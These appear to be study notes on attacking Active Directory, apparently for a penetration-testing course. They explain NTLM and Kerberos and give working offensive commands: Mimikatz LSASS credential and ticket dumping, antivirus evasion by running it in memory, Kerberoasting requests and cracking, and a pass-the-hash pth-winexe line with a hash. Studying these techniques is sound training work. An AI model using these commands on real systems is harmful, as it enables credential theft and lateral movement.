Enum


	Traditional approach

		net user

			shows AD info about the current user

		net user /domain

			shows all users in the domain

		net user <username> /domain

			if run as an admin, will show all AD info about a certain user

		net group /domain

			lists groups


	Modern approach


		[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

			enumerates info about the domain, and lists PDC

			see ad_enum.ps1 for more details and documentation


	Nested Groups


		see ad_enum.ps1 for more details and documentation


	Curretnly Logged on Users


		Can use the NetWkstaUserEnum and NetSessionEnum APIs to enumerate logged in users

			NetWkstaUserEnum queries the local PC for sessions and requires locadmin rights

			NetSessionEnum queries the DC for sessions and can be done with standard user rights

		Both listed APIs are OS APIs, and not straight forward to call. Enter Powershell-Empire and PowerView.ps1

			Get-NetLoggedon -ComputerName client251       Uses the NetWkstaUserEnum API

			Get-NetSession -ComputerName dc01             Uses the NetSessionEnum API


	Service Principal Names


		When users run an app, the app runs with their user account rights
		When a system runs an app, it runs with a Service Account
		Some systems will need an AD account for specific rights
		and the Service Principal Name will map the service on the server to the AD account

		see ad_enum.ps1 for more details and documentation


Active Directory Authentication


	NTLM


		3 nodes - the client, the app server, and the DC

		(1) The Client makes an NTLM hash of the user's supplied password
		(2) The Client sends the App Server the username 
		(3) The App Server sends a nonce / challenge
		(4) The Client encrypts the nonce using the NTLM hash and sends the Response to the App Server
		(5) The App Server sends the username, response, and nonce to the DC
		(6) The DC checks the username, finds the stored password hash, and encrypts the nonce with the stored password hash
		(7) If the Response and the encrypted hash match, the user is authenticated


	Kerberos


		3 nodes - the client, the app server, and the key distribution center (KDC)


		(1) The user logs into the Client, and the client sends an Authentication Server Request (AS_REQ). The AS_REQ is the username and a timestamp that is encrypted with a hash of the password

			Client   >>   AS_REQ (Username + {timestamp})   >>   KDC

		(2) The KDC receives the AS_REQ, looks up the username and password, and decrypts the AS_REQ. If the timestamp isn't a duplicate, which would indicate a replay attack, the auth is successful.

			KDC opens AS_REQ and checks the timestamp

		(3) The KDC replies with an Authentication Server Reply (AS_REP) that contains an encrypted session key and a Ticket Granting Ticket (TGT). The session key is encrypted with the user's password, and can be decrypted by the client.

			KDC   >>   AS_REP ({session key} + [TGT])   >>   Client

		The TGT contains the user's AD info, timestamp, IP of the client, and session key. The TGT is also encrypted by a secret key from the KDC, and is valid for 10 hours by default. Renewal is automatic

		When the user tries to access a resource

		(4) The client constructs a Ticket Granting Service Request (TGS_REQ) made of the current user and timestamp (encrypted with the session key), the SPN of the resource, and the encrypted TGT.

			Client    >>    TGS_REQ ({Username + timestamp} + SPN of resource + [TGT])    >>    KDC

		(5) The KDC receives the request, checks if the SPN exists, and the TGT is decrypted. The session key is then extracted from the TGT and used to decrypt the Username and timestamp.

			1. Check to see if the TGT has a valid timestamp
			2. Username from the TGS_REQ has to match the username from the TGT
			3. The IP from the TGS_REQ has to match the IP from the TGT

		(6) If the verification is successful, the KDC sends a Ticket Granting Server Reply (TGS_REP). This contains the SPN that access has been granted, a session key for the client-SPN connection, and a service ticket containing the username, group memberships, and newly created session key. The SPN and new session key are encrypted using the TGT session key, and the service ticket is encrypted using the password hash of the service account of the SPN

			KDC    >>    TGS_REP ({SPN} + {client-SPN session key} + {service ticket})    >>    Client

		(7) The client sends an application request (AP_REQ) to the app server. This is the username and a timestamp encrypted with the service ticket session key, along with the service key.

			Client    >>    AP_REQ ({Username + timestamp} + {service ticket})    >>    App Server

		(8) The App Server decrypts the service ticket and then extracts the Username and timestamp. If the usernames in the AP_REQ and the service ticket match, the App Server checks the group access in the service ticket to see what access should be granted


	Cached Credential Storage


		Mimikatz can be used to dump the Local Security Authority Subsystem Service (LSASS.exe) memory for the password hashes of logged in users used by NTLM and Kerberos.

			mimikatz.exe
			privilege::debug
			sekurlsa::logonpasswords

		It can also grab the Kerberos tickets from memory

			sekurlsa::tickets

		Mimikatz is likely going to be flaged by antivirus if you move the exe over and try to run it.
		Dump the LSASS.exe process through taskmanager and export to an attacker machine
		Or run Mimikatz in memory using an interpreter like Powershell using the "Invoke-Mimikatz.ps1" script


	Service Account Attacks


		Users can request access to any service and Kerberos will generate a ticket for them to access. Once they try to access the serivce, the service will decode the service ticket, then the username, and then check if that user has any rights in the App.

		Since users can ask for access to any ticket, and that service ticket contains the pw hash, we can use it to try to crack the pw of the service account for the service account of any SPN we want to target.

		Add-Type -AssemblyName System.IdentityModel
		New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'

		Once that's run, the service ticket should show up under the "klist" command and can export it with builtin APIs or with Mimikatz

			mimikatz.exe
			privilege::Debug
			kerberos::list /export

		To decrypt the service ticket and get the SPN's password hash, we can use kerberoast

			python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

		Invoke-Kerberoast.ps1 can enumerate all SPN, request service tickets, and export them in a format ready for John the Ripper or Hashcat, eliminating the need for Mimikatz for this attack


	Password Guessing


		Can see the domain's account policy with "net accounts"

		See ad_enum.ps1 for more details on password guessing


Active Directory Lateral Movement


	Pass the Hash


		Attacker connects to victim using SMB and performs auth using NTLM hash

		Only works for NTLM

		PsExec, Passing-the-hash toolkit, and Impacket all use PtH

		Most tools use PtH by starting a service (cmd, powershell) and talk to it using Named Pipes with the Service Control Manager API
			
			Requires SMB connection throught the firewall and Windows File and Print Sharing to be enabled

			Usually uses the Admin$ share to establish a connection, which needs locadmin rights

		pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd

			This works for domain accounts and the built-in local administrator account. Since the 2014 security update, this technique can not be used to authenticate as any other local admin account.

	
	Overpass the Hash


		We can use the hash of someones password to request a Kerberos TGT, which will let us into the other services

			Grab the hash using the above techniques
			